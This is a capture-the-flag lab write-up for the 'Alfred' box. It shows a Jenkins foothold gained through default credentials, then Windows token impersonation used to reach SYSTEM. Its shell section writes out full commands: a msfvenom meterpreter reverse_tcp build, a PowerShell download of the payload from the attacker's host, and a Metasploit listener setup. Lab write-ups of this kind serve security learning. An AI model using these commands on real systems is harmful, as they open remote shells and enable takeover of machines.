---
title: Alfred
tags: 
- writeups
---

## Initial Foothold
![[write-ups/images/Pasted image 20220820235756.png]]

On `8080` I tried `admin:admin` and we are in due to default credentials. 
![[write-ups/images/Pasted image 20220820230201.png]]

Browsing a little bit the application, I found out that I can create a `New Item` as `Freestyle Project`
![[write-ups/images/Pasted image 20220820230609.png]]

Then we're prompted to configure it. Under `Build` we can `add build step` & execute a windows batch command
![[write-ups/images/Pasted image 20220820230713.png]]

I'm going to use the [nishang reverse powershell script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) to get a connection back. So we need to download the `ps1` script on the target machine & execute `Invoke-PowerShellTcp`
- start http server to serve the `revsh.ps1` file: `python -m http.server 8080`
- add our payload in `Build`, apply & save
	- ![[write-ups/images/Pasted image 20220820232112.png]]
- start listener & `Build now`
	- ![[write-ups/images/Pasted image 20220820232228.png]]


### Stabilize shell
- use `msfvenom` to create a meterpreter revshell: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.12.227 LPORT=1234 -f exe -o msh.exe`
- transfer file on target: `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.18.12.227:8080/msh.exe','msh.exe')"`
- setup listener: `use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.18.12.227; set LPORT 1234; run`
- execute: `Start-Process "msh.exe"`

## Privesc
Since the box starts with an introduction on [Access Tokens](Access Tokens.md), we most definitely need to perform a [token Impersonation attack](Token Impersonation.md). 
- so I took a look @ my privileges
	- ![[write-ups/images/Pasted image 20220820233928.png]]
- then went back to my meterpreter & `load incognito` which will load the modules required to impersonate another users token
	- ![[write-ups/images/Pasted image 20220821034159.png]]
- now we can list all the available tokens
	- ![[write-ups/images/Pasted image 20220820234629.png]]
- going forward, we want to impersonate the `BUILTIN\Administrators` token, list the available processes & migrate to something owned by `NT AUTHORITY\SYSTEM` in order to get a privileged shell. In this case I choose [lsass.exe](lsass.exe (Local Security Authority Subsystem Service).md)
	- ![[write-ups/images/Pasted image 20220820234648.png]]
	- ![[write-ups/images/Pasted image 20220820234706.png]]
	- ![[write-ups/images/Pasted image 20220820234722.png]]


## Refs
- [Abusing Token Privileges for LPE](https://www.exploit-db.com/papers/42556)
- [Token Impersonation Notes](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/access-token-manipultion/token-impersonation)

## See Also
- [[write-ups/THM]]
- [[Access Tokens]]
- [[sheets/Token Impersonation]]
